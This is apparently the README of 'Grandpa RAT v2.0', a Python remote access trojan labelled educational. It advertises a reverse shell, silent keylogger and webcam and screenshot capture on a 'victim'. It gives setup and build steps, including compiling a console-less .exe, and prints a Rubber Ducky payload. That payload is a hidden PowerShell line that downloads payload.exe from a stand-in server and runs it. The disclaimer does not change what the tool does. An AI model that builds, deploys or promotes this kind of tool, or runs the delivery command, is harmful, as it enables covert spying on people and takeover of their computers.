📘 README.md
markdown
Copy
Edit
# 👴 Grandpa RAT v2.0 - Remote Access Tool (Educational)

**Grandpa RAT v2.0** is a modular Remote Access Tool (RAT) built in Python for educational and ethical hacking labs. This tool enables secure remote administration, basic surveillance, and command execution through a stealth client-server setup with both GUI and terminal-based controllers.

> ⚠️ **Educational Use Only.** Do not deploy on unauthorized systems. Built for testing in controlled environments such as VMs or cybersecurity labs.

---

## 🧠 Features

| Feature                | Description                                     |
|------------------------|-------------------------------------------------|
| 🔁 Reverse Shell      | Execute remote shell commands on the victim    |
| 🔐 Password Protection| Secure client-server communication             |
| 📷 Screenshot Capture | Take and retrieve desktop screenshots          |
| 🎥 Webcam Snapshot    | Capture image from victim’s webcam             |
| ⌨️ Keylogger         | Log keystrokes silently in the background      |
| 🧠 GUI Controller     | Intuitive Tkinter-based interface              |
| 🖥️ Terminal Controller| Optional command-line controller               |
| 💉 Rubber Ducky Script| USB attack payload to auto-deploy client       |
| 🔧 Obfuscation Ready  | Placeholder for `.exe` stealth tools (WIP)     |

---

## 📂 Project Structure

GrandpaRAT-v2.0/ ├── client/ # RAT client scripts (keylogger, webcam, shell) ├── server/ # GUI & CLI controllers ├── delivery/ # USB-based rubber ducky payload ├── build_tools/ # Obfuscation & EXE builder ├── Screenshot (11).png # GUI controller screenshot ├── Screenshot (12).png # Live connection preview ├── README.md # This documentation └── .gitignore # Git exclusions

yaml
Copy
Edit

---

## 🚀 Getting Started

### 📦 Install Dependencies

```bash
pip install pyautogui opencv-python pynput
🧪 Usage
1. Start the GUI controller (server)
bash
Copy
Edit
cd server
python gui_controller.py
2. Run the RAT client (on victim or VM)
bash
Copy
Edit
cd client
python rat_client.py
3. From GUI, send commands like:
whoami, ipconfig

screenshot, webcam

exit

🖼️ Screenshots
GUI Controller

Live Connection View

🛠️ Building Client to .exe
Install PyInstaller:

bash
Copy
Edit
pip install pyinstaller
Build the EXE:

bash
Copy
Edit
pyinstaller --onefile --noconsole rat_client.py
The .exe will be created inside /dist/

✅ Tip: Run it in a test VM and use your controller to manage the session.

🧪 USB Rubber Ducky Payload
Found in delivery/rubber_ducky_payload.txt — this is a payload you can flash onto a Rubber Ducky or HID emulator:

powershell
Copy
Edit
powershell -w hidden -c "iwr http://yourserver/payload.exe -OutFile $env:temp\\rat.exe; Start-Process $env:temp\\rat.exe"
🔒 Legal Disclaimer
This software is provided for educational purposes only.
Unauthorized access to computer systems is illegal.
Use only on systems you own or are authorized to test.
The author assumes no responsibility for misuse.

👨‍💻 Author
Matthew Ogoh – Cybersecurity Specialist & Ethical Hacker
GitHub: @grandpacltn
Twitter: @cybergrandpa

⭐ Star The Project
If this helped you learn ethical hacking or inspired your own build, give it a ⭐ and share it with fellow learners!
